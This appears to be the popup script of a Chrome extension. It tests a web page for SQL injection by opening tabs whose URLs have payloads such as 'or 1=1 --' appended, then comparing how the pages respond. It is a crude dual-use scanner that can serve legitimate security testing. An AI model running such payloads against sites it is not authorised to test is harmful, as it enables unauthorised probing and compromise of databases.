var options = ["or 1=1 --", "' or 1=1 --"];
var errorDiv;
var msgDiv;
var urlInput;
var buttonNode;
var storage = chrome.storage.local;

function getUrl() {
	return urlInput.value;
}

function injectSQL(url_arg) {
	//Create original tab
	chrome.windows.getCurrent(function(currentWindow) {
		chrome.tabs.query({
			active : true,
			windowId : currentWindow.id
		}, function(activeTabs) {
			//Create tab to comparison
			chrome.tabs.create({
				selected : false,
				url : "comparison.html"
			});

			//Open tab initial tab
			//if (url_arg != activeTabs[0].url) {
			chrome.tabs.create({
				selected : false,
				url : url_arg
			}, function(createdTab) {
				chrome.tabs.executeScript(createdTab.id, {
					file : "injectCode.js"
				});
			});

			for ( i = 0; i < options.length; i++) {
				chrome.tabs.create({
					selected : false,
					url : url_arg + options[i]
				}, function(createdTab) {
					chrome.tabs.executeScript(createdTab.id, {
						file : "injectCode.js"
					});
				});
			}

			log("Successful injection. Using " + options.length + " queries.");

			// chrome.extension.sendMessage({
			// action : "",
			// size : DOMtoString(document)
			// })

		});
	});
}

function cleanMSGs() {
	errorDiv.style.visibility = "hidden";
	msgDiv.style.visibility = "hidden";
}

function parseUrl(uri) {
	if (uri.protocol() != "http") {
		uri.protocol("http");
	}
	if (uri.query() == "") {
		printError("Querry not defined");
		return false;
	}
	return true;
}

function printError(error) {
	cleanMSGs();
	errorDiv.innerHTML = error;
	errorDiv.style.visibility = 'visible';
}

function log(msg) {
	cleanMSGs();
	console.log(msg);
	msgDiv.innerHTML = msg;
	msgDiv.style.visibility = 'visible';
}

function getCurrentUrl() {
	chrome.windows.getCurrent(function(currentWindow) {
		chrome.tabs.query({
			active : true,
			windowId : currentWindow.id
		}, function(activeTabs) {
			urlInput.value = activeTabs[0].url;
		});
	});
}

window.onload = function() {
	errorDiv = document.getElementById("error");
	buttonNode = document.getElementById("inject_button");
	urlInput = document.getElementById("urlInput");
	msgDiv = document.getElementById("msg");

	cleanMSGs();
	storage.get('options', function(items) {
		options = items.options;
		log("Loaded options: <br>" + options.join("<br>"));
	});

	document.getElementById("currentAnchor").addEventListener('click', function() {
		chrome.windows.getCurrent(function(currentWindow) {
			chrome.tabs.query({
				active : true,
				windowId : currentWindow.id
			}, function(activeTabs) {
				urlInput.value = activeTabs[0].url;
			});
		});
	})

	buttonNode.addEventListener('click', function() {
		var uri = new URI(getUrl());
		if (!parseUrl(uri)) {
			return;
		}
		injectSQL(uri.toString());
	}, false);

	// chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
	// console.log(sender.tab ? "from a content script:" + sender.tab.url : "from the extension");
	// alert(request.source);
	// sendResponse({response: "ok"});
	// });
};
